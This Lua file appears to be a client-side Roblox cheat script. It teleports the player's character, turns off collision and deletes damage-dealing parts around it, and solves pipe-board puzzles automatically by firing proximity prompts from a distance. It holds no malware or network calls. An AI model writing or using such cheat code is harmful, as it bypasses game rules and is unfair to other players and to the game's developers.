function UnCollisionAll(TeleportCFrame)
	for _, Part in Main.UnCollisionBoxCollisionParts do
		if Part ~= nil then
			if Part.Parent ~= nil then
				if Part:IsA("BasePart") and Part.Name ~= "CollisionPart" then
					Part.CanCollide = true
				end
			end
		end
	end

	local TemporaryFloor = game.Workspace:FindFirstChild("TemporaryFloor")
	if TemporaryFloor == nil then
		TemporaryFloor = Instance.new("Part", game.Workspace)
		TemporaryFloor.Name = "TemporaryFloor"
		TemporaryFloor.Transparency = 0.5
		TemporaryFloor.Anchored = true
		TemporaryFloor.CanCollide = true
		TemporaryFloor.CastShadow = false
		TemporaryFloor.Size = Vector3.new(8, 1, 8)
	end

	local UncollisionBox = game.Workspace:FindFirstChild("UncollisionBox")
	if UncollisionBox == nil then
		UncollisionBox = Instance.new("Part", game.Workspace)
		UncollisionBox.Name = "UncollisionBox"
		UncollisionBox.Transparency = 0.5
		UncollisionBox.Anchored = true
		UncollisionBox.CanCollide = false
		UncollisionBox.CastShadow = false
		UncollisionBox.Size = Vector3.new(8, 8, 8)
	end

	UncollisionBox.CFrame = TeleportCFrame
	TemporaryFloor.CFrame = TeleportCFrame + Vector3.new(0, -4, 0)

	for _, Part in game.Workspace:GetPartsInPart(UncollisionBox) do
		if Part.Parent ~= game.Players.LocalPlayer.Character and Part:IsA("BasePart") then
			if Part:GetAttribute("Active") and Part:GetAttribute("Damage") then
				Part:Destroy()
				print("Deleted Dangerous Part")
			end
			if Part.CanCollide == true and Part ~= TemporaryFloor then
				Part.CanCollide = false
				table.insert(Main.UnCollisionBoxCollisionParts, Part)
			end
		end
	end
end

function ChangePipes(Room)
	local Finished = true
	
	if Room ~= nil then
		for Board, Pipes in RoomSkip.BoardPuzzles do
			if Room:FindFirstChild(Board) then
				if Room[Board]:FindFirstChild("puzzle") and Room[Board]:FindFirstChild("Main") and Room[Board]:FindFirstChild("Power") then
					local BoardPuzzleMain = Room[Board].Main
					local PowerPipe = Room[Board].Power

					for PipePosition, PipeRotation in Pipes do
						if Main.CharacterRoot ~= nil then
							local TeleportCFrame = BoardPuzzleMain.CFrame
							UnCollisionAll(TeleportCFrame)
							Main.CharacterRoot.CFrame = TeleportCFrame
							
							local Column = tonumber(string.split(PipePosition, "-")[1])
							local Row = tonumber(string.split(PipePosition, "-")[2])

							local PipeFindPart = game.Workspace:FindFirstChild("BoardPuzzlePipeFindPart")
							if PipeFindPart == nil then
								PipeFindPart = Instance.new("Part", game.Workspace)
								PipeFindPart.Name = "BoardPuzzlePipeFindPart"
								PipeFindPart.Transparency = 0.5
								PipeFindPart.Anchored = true
								PipeFindPart.CanCollide = true
								PipeFindPart.CastShadow = false
								PipeFindPart.Size = Vector3.new(0.5, 0.5, 0.5)
							end

							PipeFindPart.Position = PowerPipe.Position - (BoardPuzzleMain.CFrame.UpVector * (1.5 * (Column - 1)) + BoardPuzzleMain.CFrame.RightVector * (1.5 * Row))

							for _, PipePart in game.Workspace:GetPartsInPart(PipeFindPart) do
								if PipePart.Name == "Part" and PipePart.Parent ~= nil then
									if PipePart.Parent.Parent ~= nil then
										if PipePart.Parent.Parent == Room[Board].puzzle then
											local NeedRotate = true
											for _, Degree in PipeRotation do
												if math.round(PipePart.Orientation.Z) ~= -180 then
													if math.round(PipePart.Orientation.Z) == Degree then
														NeedRotate = false
													end
												else
													if math.round(math.abs(PipePart.Orientation.Z)) == Degree then
														NeedRotate = false
													end
												end
											end

											if NeedRotate == true then
												if PipePart.Parent:FindFirstChild("Highlight") then
													if PipePart.Parent.Highlight:FindFirstChildWhichIsA("ProximityPrompt") then						
														local PromptPressed = false
														PipePart.Parent.Highlight:FindFirstChildWhichIsA("ProximityPrompt").Triggered:Connect(function()
															PromptPressed = true
														end)
														
														while PromptPressed == false do
															for _, OtherPipes in Room[Board].puzzle:GetChildren() do 
																if OtherPipes:FindFirstChild("Highlight") then
																	if OtherPipes.Highlight:FindFirstChildWhichIsA("ProximityPrompt") then
																		OtherPipes.Highlight:FindFirstChildWhichIsA("ProximityPrompt").Enabled = false
																	end
																end
															end
															
															PipePart.Parent.Highlight.Anchored = true
															PartInFrontOfCamera(PipePart.Parent.Highlight, 3)
															PipePart.Parent.Highlight:FindFirstChildWhichIsA("ProximityPrompt").MaxActivationDistance = 100
															PipePart.Parent.Highlight:FindFirstChildWhichIsA("ProximityPrompt").Enabled = true
															PipePart.Parent.Highlight:FindFirstChildWhichIsA("ProximityPrompt"):InputHoldBegin()
															PipePart.Parent.Highlight:FindFirstChildWhichIsA("ProximityPrompt"):InputHoldEnd()
															task.wait()
														end
									
													end
												end
												Finished = false	
											end
										end
									end
								end
							end
						end
					end
				end
			end
		end
	end
	
	if Finished == false then
		task.wait(0.5)
	end
	
	return Finished
end

